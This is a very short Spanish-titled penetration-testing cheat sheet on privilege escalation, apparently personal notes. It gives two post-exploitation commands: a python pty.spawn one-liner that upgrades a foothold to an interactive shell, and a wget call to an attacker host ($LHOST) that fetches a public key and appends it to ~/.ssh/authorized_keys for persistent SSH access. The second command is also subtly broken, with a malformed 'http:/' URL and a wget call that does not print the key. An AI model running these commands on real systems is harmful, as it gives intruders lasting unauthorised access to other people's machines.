# Elevacion de privilegios

## Spawing shell

1) Shell interactiva --> `python -c 'import pty; pty.spawn("/bin/sh")'; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export TERM=xterm; export SHELL=bash`

2) Add public key to authorized keys  --> `echo $(wget http:/$LHOST/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys`
